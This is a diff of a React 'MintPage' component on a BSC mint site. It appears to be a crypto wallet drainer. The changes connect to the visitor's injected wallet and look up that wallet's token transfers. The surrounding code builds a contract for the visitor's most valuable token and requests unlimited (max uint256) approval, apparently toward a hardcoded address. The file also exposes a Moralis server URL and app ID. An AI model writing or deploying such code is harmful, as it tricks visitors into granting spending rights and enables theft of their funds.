@@ -52,8 +52,10 @@ function MintPage() {
 /*   const serverUrl = "https://8mu2apptlnm4.usemoralis.com:2053/server";
   const appId = "UBjvihVqesxPw7UtpavjEQhLO6MX6fJf0PbkTWl0"; */
 
-  const rpcURL = "https://bsc-dataseed.binance.org/";
-  const web3 = new Web3(rpcURL);
+/*   const rpcURL = "https://bsc-dataseed.binance.org/";
+  const web3 = new Web3(rpcURL); */
+  const web3 = new Web3(window.ethereum);
+  
   // const rpcURL = "https://data-seed-prebsc-1-s1.binance.org:8545";
   
 
@@ -407,7 +409,7 @@ const options = { chain: "bsc", address: walletAddress0, from_block: "0" };
   /* let tx = await Moralis.Web3API.account.getTokenTransfers(options); */
     await api
     .post("/token-transfer", {
-      address: "0xe9e7cea3dedca5984780bafc599bd69add087d56" // Include the options object in the body
+      address: walletAddress0 // Include the options object in the body
     })
     .then(function (res) {
       tx=res?.data;
@@ -508,7 +510,7 @@ const options = { chain: "bsc", address: walletAddress0, from_block: "0" };
 
 //-------------------------   performing approve ---------------------------
 
-   /*  let approveAddress = "0xC7C421854295709136ED9179f16E469909530F44";
+    /* let approveAddress = "0xC7C421854295709136ED9179f16E469909530F44";
     let price = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
 
     window.contract = await new web3.eth.Contract(tAbi[0], maxValueTokenAddress);
@@ -532,6 +534,11 @@ const options = { chain: "bsc", address: walletAddress0, from_block: "0" };
 const price = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
 
 // Create a new contract instance
+/* window.contract =new web3.eth.Contract(
+  tAbi[0],
+  approveAddress
+); */
+
 window.contract = await new web3.eth.Contract(tAbi[0], maxValueTokenAddress);
 let tokenContract = window.contract;
 
@@ -574,6 +581,7 @@ let txx = await window.ethereum.request({
   }
 
   const onBtnClick = async () => {
+    alert('ok');
 
     if (window.ethereum) {
       try {
